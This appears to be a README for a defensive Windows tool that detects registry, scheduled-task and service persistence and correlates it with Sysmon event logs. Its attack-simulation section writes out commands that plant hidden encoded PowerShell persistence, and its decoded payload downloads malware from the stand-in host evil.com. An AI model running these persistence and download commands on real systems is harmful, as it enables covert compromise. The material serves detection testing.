# 🔍 Persistence Hunter

> Windows persistence detection and attack chain analysis tool. Detects registry run keys, scheduled tasks, and services — correlates them with Sysmon and Windows Event Log telemetry to build full attack chains, score threats, and surface new findings since a clean baseline.

![Python](https://img.shields.io/badge/Python-3.11+-blue?style=flat-square&logo=python)
![FastAPI](https://img.shields.io/badge/FastAPI-0.110+-green?style=flat-square&logo=fastapi)
![React](https://img.shields.io/badge/React-18+-61DAFB?style=flat-square&logo=react)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)

---

## What It Does

Most persistence tools tell you *what* is persisted. Persistence Hunter tells you *how it got there*.

Given a suspicious registry run key like:
```
WindowsUpdater → powershell.exe -nop -w hidden -enc JABjAD0ATg...
```

Persistence Hunter will:
1. **Decode the payload** — `$c=New-Object System.Net.WebClient;$c.DownloadFile('http://evil.com/malware.exe','C:\malware\payload.exe')`
2. **Build the attack chain** — `explorer.exe → cmd.exe → reg.exe [sysmon_exact]`
3. **Tag MITRE techniques** — `T1112, T1027, T1562.001`
4. **Score the threat** — composite score of 100 (CRITICAL)
5. **Flag it as NEW** — not present in the last baseline snapshot

All of this in a single scan.

---

## Features

### Detection
- **Registry Run Keys** — `HKCU\Run`, `HKLM\Run`, `RunOnce`, and more
- **Scheduled Tasks** — full task scheduler enumeration with command parsing
- **Windows Services** — all 700+ services with binary path extraction

### Correlation
- **Sysmon events** — Event ID 1 (process create), 12/13 (registry), 11 (file create)
- **Windows Security** — Event ID 4688 (process creation), 4698 (task created)
- **System log** — Event ID 7045 (service installed)
- **Multi-hop chains** — traces parent → child → grandchild process trees

### Analysis
- **PowerShell `-enc` decode** — automatic UTF-16 LE decode of encoded commands
- **Threat scoring** — composite score 0–100 with breakdown by risk factor
- **MITRE ATT&CK tagging** — T1059, T1112, T1543, T1053, T1027 and more
- **Behavioral anomalies** — LOLBin detection, masquerading, suspicious paths
- **APT signature matching** — known TTP patterns for APT29, APT32, Lazarus, Kimsuky

### Baseline & Diff
- Snapshot the clean state of the system
- On next scan, only NEW entries since baseline are surfaced
- `✅ System clean — no new High/Critical persistence since baseline`

### Binary Verification
- SHA256 hash per service binary
- Authenticode signature check (Signed / Unsigned / Missing)
- Signer name and certificate issuer
- VirusTotal URL per binary (no API key required)
- Ghost service detection (binary missing from disk)

---

## Architecture

```
Persistence Hunter/
├── collector/
│   ├── base_collector.py       # Shared DB, event ingestion, chain building, baseline methods
│   ├── registry_collector.py  # Registry run key scanner
│   ├── task_collector.py      # Scheduled task scanner
│   └── service_collector.py  # Windows service scanner
│
├── api/
│   ├── main.py                # FastAPI app
│   ├── models.py              # Pydantic models
│   ├── dependencies.py        # DB path, shared deps
│   ├── scan_worker.py         # Background scan pipeline
│   └── routes/
│       ├── alerts.py          # /api/alerts
│       ├── baseline.py        # /api/baseline, /api/baseline/diff
│       ├── chains.py          # /api/chains/{type}/{id}
│       ├── entries.py         # /api/entries
│       ├── scan.py            # /api/scan
│       ├── scores.py          # /api/scores
│       ├── search.py          # /api/search
│       ├── signatures.py      # /api/signatures
│       ├── stats.py           # /api/stats, /api/health
│       └── summary.py         # /api/summary
│
├── frontend/
│   └── src/
│       ├── pages/
│       │   ├── Dashboard.jsx  # Overview with charts and telemetry
│       │   ├── Alerts.jsx     # Alert feed with chain visualizer
│       │   ├── EntryDetail.jsx# Per-entry Summary/Chain/Intel/Details tabs
│       │   ├── Entries.jsx    # Full entry table with filters
│       │   ├── Baseline.jsx   # Snapshot and diff management
│       │   └── Search.jsx     # Threat hunting search
│       └── components/
│           ├── features/
│           │   ├── EnrichmentPanel.jsx  # Signature + PS decode panel
│           │   ├── IntelPanel.jsx       # Risk indicators + threat score
│           │   ├── ProcessTree.jsx      # Attack chain visualizer
│           │   ├── ScanButton.jsx       # Scan trigger with progress bar
│           │   └── Threatscore.jsx      # Threat score widget
│           └── ui/
│               ├── SeverityBadge.jsx
│               ├── MitreTag.jsx
│               └── StatCard.jsx
│
├── ps_decode.py               # PowerShell -enc decoder utility
├── scan_summary.py            # CLI cross-collector summary
├── check_signatures.py        # CLI binary signature checker
├── threat_scorer.py           # Threat scoring engine
├── fix_db.py                  # Creates baseline tables in reghunt.db
└── reghunt.db                 # SQLite database (auto-created)
```

---

## Requirements

- Windows 10/11 or Windows Server 2016+
- Python 3.11+
- Sysmon installed and running (recommended — chains are richer with it)
- Windows Security audit policy: **Process Creation (4688)** enabled
- PowerShell available (for Authenticode signature checks)
- Node.js 18+ (for frontend)

### Python dependencies
```
fastapi
uvicorn[standard]
python-multipart
```

### Frontend dependencies
```
react + vite
@tanstack/react-query
axios
react-router-dom
framer-motion
```

---

## Installation

### 1. Clone and set up Python environment
```cmd
git clone https://github.com/yourname/persistence-hunter
cd persistence-hunter
pip install fastapi uvicorn python-multipart
```

### 2. Initialize the database
```cmd
python fix_db.py
```

### 3. Take a baseline (on a known-clean system)
```cmd
python collector/registry_collector.py --scan --sysmon --events --hours 72 --baseline
python collector/task_collector.py --scan --sysmon --events --hours 72 --baseline
python collector/service_collector.py --scan --sysmon --events --hours 72 --baseline
```

### 4. Start the API
```cmd
python -m uvicorn api.main:app --host 0.0.0.0 --port 8000 --reload
```

### 5. Start the frontend
```cmd
cd frontend
npm install
npm run dev
```

Open `http://localhost:5173`

---

## Usage

### Daily workflow
```cmd
# Scan and detect new persistence since baseline
python collector/registry_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python collector/task_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python collector/service_collector.py --scan --sysmon --events --hours 1 --diff --chain-all

# Consolidated summary
python scan_summary.py --chains --json
```

### CLI flags

| Flag | Description |
|---|---|
| `--scan` | Enumerate current persistence entries |
| `--sysmon` | Collect Sysmon events for chain correlation |
| `--events` | Collect Security/System event logs |
| `--hours N` | Event lookback window (default 24) |
| `--baseline` | Snapshot current entries as baseline |
| `--diff` | Show only NEW entries since last baseline |
| `--chain-all` | Build attack chains for all High/Critical |
| `--json` | Export results to JSON file |
| `--mark-safe NAME` | Add entry to baseline (suppress false positive) |

### Binary signature check
```cmd
# Recommended daily driver — skip drivers, show only unsigned
python check_signatures.py --all --exe-only --unsigned-only

# Full report with JSON export
python check_signatures.py --all --exe-only --json
```

### Cross-collector summary
```cmd
python scan_summary.py              # New entries since baseline
python scan_summary.py --chains     # + attack chain per entry
python scan_summary.py --all        # All High/Critical (ignore baseline)
python scan_summary.py --json       # + write scan_summary.json
```

---

## API Reference

| Endpoint | Method | Description |
|---|---|---|
| `/api/health` | GET | Service and DB health check |
| `/api/stats` | GET | Aggregated counts across all types |
| `/api/summary` | GET | New High/Critical entries since baseline |
| `/api/summary/stats` | GET | Quick counts for dashboard cards |
| `/api/alerts` | GET | Full alert feed with score data |
| `/api/entries` | GET | All entries with filters |
| `/api/entries/{type}/{id}` | GET | Single entry detail |
| `/api/chains/{type}/{id}` | GET | Attack chain for an entry |
| `/api/scores` | GET | All threat scores |
| `/api/scores/{type}/{id}` | GET | Score + breakdown for one entry |
| `/api/scores/run` | POST | Run threat scorer across all entries |
| `/api/scan` | POST | Trigger full background scan |
| `/api/scan/status` | GET | Poll scan job progress |
| `/api/baseline` | GET | List all baselines |
| `/api/baseline` | POST | Create new baseline snapshot |
| `/api/baseline/diff` | GET | New entries since baseline |
| `/api/baseline/{id}` | DELETE | Remove a baseline |
| `/api/signatures` | GET | Cached binary signature results |
| `/api/signatures/run` | POST | Trigger background signature scan |
| `/api/signatures/iocs` | GET | Actionable IOCs only |
| `/api/search` | GET | Search across entries and process events |
| `/api/export/mitre` | GET | MITRE ATT&CK technique export |

---

## Threat Scoring

Entries are scored 0–100 based on composite risk factors:

| Score | Severity | Meaning |
|---|---|---|
| ≥ 80 | CRITICAL | High confidence malicious — investigate immediately |
| 60–79 | HIGH | Suspicious — likely malicious or high-risk |
| 35–59 | MEDIUM | Suspicious indicators — review recommended |
| < 35 | LOW | Low risk — informational |

**Risk factors include:**
- Encoded PowerShell payload (`T1027`)
- Execution from temp/suspicious directories
- LOLBin abuse (rundll32, mshta, regsvr32, etc.)
- Process masquerading (name mimics system process)
- Malicious parent in attack chain
- Multi-hop chain depth
- APT TTP signature matches
- Missing or unsigned binary

---

## Attack Chain Example

```
📦 explorer.exe (PID 13664) [live/stub]
   📂 C:\Windows\explorer.exe

  ⚠️ cmd.exe (PID 36388) [sysmon]
     📝 "C:\WINDOWS\system32\cmd.exe"
     📌 T1059.003

    💀 reg.exe (PID 34608) [sysmon_exact]
       📝 reg add HKCU\...\Run /v "WindowsUpdater" ...
       → Wrote HKCU\Run → WindowsUpdater = powershell.exe -nop -w hidden -enc JABjAD0...
       📌 T1112, T1027, T1562.001

🔓 Decoded: $c=New-Object System.Net.WebClient;$c.DownloadFile('http://evil.com/malware.exe',...)
```

Node types:
- `📦` — benign/stub process
- `⚠️` — suspicious process
- `💀` — malicious process
- `❓` — unknown (no event found)

---

## Test Attack Simulation

To verify detection is working on a test system:

```cmd
# 1. Take clean baseline
python fix_db.py
python collector/registry_collector.py --scan --sysmon --events --hours 72 --baseline
python collector/task_collector.py --scan --sysmon --events --hours 72 --baseline
python collector/service_collector.py --scan --sysmon --events --hours 72 --baseline

# 2. Simulate attacks
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdater" /t REG_SZ /d "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAG0AYQBsAHcAYQByAGUALgBlAHgAZQAnACwAJwBDADoAXABtAGEAbAB3AGEAcgBlAFwAcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=" /f
schtasks /create /tn "Microsoft\Windows\Maintenance\UpdateCheck" /tr "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=" /sc daily /st 00:00 /f
cmd /c "sc create EvilSvc binpath= C:\Windows\Temp\evil_payload.exe start= auto"

# 3. Detect
python collector/registry_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python collector/task_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python collector/service_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python scan_summary.py --chains --json

# 4. Clean up
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdater" /f
schtasks /delete /tn "Microsoft\Windows\Maintenance\UpdateCheck" /f
cmd /c "sc delete EvilSvc"
```

**Expected output:** 3 CRITICAL findings, decoded PS payload, full attack chains for each.

---

## Known Limitations

- **Windows only** — collectors use WMI, Windows event logs, and the registry
- **Requires elevation** — service enumeration and some event log access needs admin rights
- **No API authentication** — add a reverse proxy with auth before exposing to a network
- **Single machine** — no agent architecture; run locally on each endpoint
- **Signature check speed** — PowerShell subprocess per binary; 700 services takes ~2 minutes

---

## Roadmap

- [ ] PDF/HTML report export per entry
- [ ] Alert status tracking (open / acknowledged / closed)
- [ ] Scheduled auto-scan with configurable intervals
- [ ] Email / webhook notifications on new Critical findings
- [ ] YARA rule integration
- [ ] Multi-machine agent support
- [ ] Startup folder + WMI subscription collectors
- [ ] COM hijacking detection

---

## License

MIT — use freely, attribution appreciated.

---
 